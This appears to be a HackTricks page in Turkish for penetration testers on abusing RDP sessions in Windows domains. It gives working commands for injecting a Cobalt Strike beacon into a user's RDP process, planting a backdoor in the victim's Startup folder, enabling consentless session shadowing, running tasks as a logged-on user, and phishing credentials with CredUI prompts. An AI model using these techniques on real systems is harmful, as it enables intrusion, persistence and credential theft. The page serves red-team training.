# RDP Oturumlarının Kötüye Kullanımı

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Mevcut etki alanındaki bir **bilgisayara** **RDP erişimi** olan **harici grup** üyesi, bu bilgisayarı ele geçiren bir saldırganın grup üyelerinden birinin bağlanmasını beklemesine olanak tanır.

Kullanıcı RDP üzerinden bağlandığında, **saldırgan kullanıcının oturumuna pivot edebilir** ve kullanıcının harici etki alanındaki izinlerini kötüye kullanabilir.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Cross-Session Authentication Relay

Başka bir domain kullanıcısına ait **aktif bir console veya RDP oturumu**, aynı host üzerinde daha düşük ayrıcalıklı bir shell'iniz olduğunda da bir ipucudur. DCOM cross-session activation, bu etkileşimli oturumdaki uygun bir COM server'ın kimlik doğrulaması yapmasına neden olabilir; RemotePotato0 veya KrbRelay gibi araçlar da bu kimlik doğrulamayı yakalayabilir veya relay edebilir. Oturum açmış kullanıcının domain administrator olması gerekmez: gMSA managed password'ı okuma izni gibi kapsamı dar bir directory right, daha ileri bir pivot için yeterli olabilir.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

`query user`, `qwinsta` veya mevcut winPEAS session inventory çıktısından session ID'yi ve kimliği öğrenerek başlayın. Bunları relay yolunun kanıtı olarak değil, **adaylar** olarak değerlendirin. COM class'ı, impersonation ve authentication seviyeleri, session erişilebilirliği, firewall/OXID routing, hedef protokol korumaları ve oturum açmış kullanıcının etkin izinleri önemlidir. KrbRelay, cross-session LDAP, HTTP, SMB ve NTLM örneklerini belgeliyor; ancak bu yollar sürüme ve yapılandırmaya bağlıdır. LDAP channel binding de hedef tarafında relay'i engelleyen bir unsurdur. Özellikle RemotePotato0 projesi, ilk RPC-to-LDAP exploit senaryosunun 2022'de düzeltildiğini belirtiyor; yalnızca görünür bir oturum var diye LDAP relay'in başarılı olacağını varsaymayın.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Bir kullanıcı, kendisini bekleyen bir **saldırganın** bulunduğu bir **makineye RDP ile erişirse**, saldırgan **kullanıcının RDP oturumuna bir beacon enjekte edebilir**. Kullanıcı RDP ile bağlanırken **sürücüsünü bağladıysa**, **saldırgan bu sürücüye erişebilir**.

Bu durumda **kurbanın** **orijinal bilgisayarına**, **başlangıç klasörüne** bir **backdoor** yazarak erişimi ele geçirebilirsiniz.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Kurbanın zaten **active RDP session**'ı olan bir host'ta **local admin** iseniz, **parolayı çalmadan veya LSASS'ı dump etmeden** bu masaüstünü **görüntüleyebilir/kontrol edebilirsiniz**.<sup>[[1]](#references)</sup>

Bu, şurada saklanan **Remote Desktop Services shadowing** ilkesine bağlıdır:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Interesting values:

- `0`: Devre dışı
- `1`: `EnableInputNotify` (kontrol, kullanıcı onayı gerekir)
- `2`: `EnableInputNoNotify` (kontrol, **kullanıcı onayı gerekmez**)
- `3`: `EnableNoInputNotify` (yalnızca görüntüleme, kullanıcı onayı gerekir)
- `4`: `EnableNoInputNoNotify` (yalnızca görüntüleme, **kullanıcı onayı gerekmez**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Bu, özellikle RDP üzerinden bağlanan ayrıcalıklı bir kullanıcı kilidi açık bir masaüstü, KeePass oturumu, MMC konsolu, tarayıcı oturumu veya yönetici kabuğu açık bıraktığında kullanışlıdır.

## Oturum Açmış Kullanıcı Olarak Zamanlanmış Görevler

**local admin** yetkiniz varsa ve hedef kullanıcı **şu anda oturum açmışsa**, Task Scheduler parolasını bilmeden o kullanıcı olarak kod başlatabilir.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Bu, kurbanın mevcut oturum açma oturumunu bir çalıştırma aracına dönüştürür:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Notlar:

- Kullanıcı **oturum açmamışsa**, Windows genellikle onun olarak çalışacak bir görev oluşturmak için parolayı ister.
- Kullanıcı **oturum açmışsa**, görev mevcut oturum açma bağlamını yeniden kullanabilir.
- Bu, LSASS'a dokunmadan kurbanın oturumunda GUI eylemleri gerçekleştirmek veya binary'leri başlatmak için pratik bir yöntemdir.

## Kurban Oturumundan CredUI Prompt Abuse

**Kurbanın etkileşimli masaüstünde** (örneğin **Shadow RDP** veya **kullanıcı olarak çalışan bir zamanlanmış görev** aracılığıyla) kod çalıştırabildiğinizde, CredUI API'lerini kullanarak **gerçek bir Windows kimlik bilgisi istemi** görüntüleyebilir ve kurbanın girdiği kimlik bilgilerini ele geçirebilirsiniz.<sup>[[1]](#references)</sup>

İlgili API'ler:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Tipik akış:

1. Kurbanın oturumunda bir binary başlatın.
2. Mevcut etki alanı markalamasıyla eşleşen bir etki alanı kimlik doğrulama istemi görüntüleyin.
3. Döndürülen kimlik doğrulama arabelleğinin içeriğini çıkarın.
4. Sağlanan kimlik bilgilerini doğrulayın ve isteğe bağlı olarak geçerli kimlik bilgileri girilene kadar istemi göstermeye devam edin.

İstem sahte bir HTML formu yerine standart Windows API'leri tarafından görüntülendiğinden, bu yöntem **on-host phishing** için kullanışlıdır.

## Kurbanın Bağlamında PFX İsteme

Aynı **kullanıcı olarak zamanlanmış görev** primitive'i, oturum açmış kurban olarak **sertifika/PFX** istemek için kullanılabilir. Bu sertifika daha sonra parola çalmaya hiç gerek kalmadan, söz konusu kullanıcı olarak **AD kimlik doğrulaması** için kullanılabilir.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Üst düzey akış:

1. Kurbanın oturum açmış olduğu bir host'ta **local admin** yetkisi elde edin.
2. Bir **zamanlanmış görev** kullanarak kayıt/dışa aktarma mantığını kurban olarak çalıştırın.
3. Ortaya çıkan **PFX** dosyasını dışa aktarın.
4. PFX'i PKINIT / sertifika tabanlı AD kimlik doğrulaması için kullanın.

Devamındaki abuse senaryoları için AD CS sayfalarına bakın:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Düz ağlardan katmanlama modelleriyle kilitlenmiş etki alanlarına](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – `mstsc` gölge oturumu seçenekleri](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - Shadow RDP eklentisi PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as modülü](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Zamanlanmış görev aracılığıyla PFX isteme PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - oturumlar arası DCOM etkinleştirme ve mevcut kısıtlamalar](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - oturumlar arası relay örnekleri ve CLSID gereksinimleri](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - query session komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - ms-DS-GroupMSAMembership özniteliği](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP channel binding ve relay koruması](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
